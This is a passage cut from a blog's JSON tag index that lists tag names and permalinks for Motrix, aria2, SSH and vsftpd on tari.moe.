8%E8%85%BE/"},{"name":"Motrix","slug":"Motrix","permalink":"https://tari.moe/tags/Motrix/"},{"name":"aria2","slug":"aria2","permalink":"https://tari.moe/tags/aria2/"},{"name":"SSH","slug":"SSH","permalink":"https://tari.moe/tags/SSH/"},{"name":"vsftpd","slug":"vsftpd","permalink":"https://tari.moe/tags/vsftpd/"}]}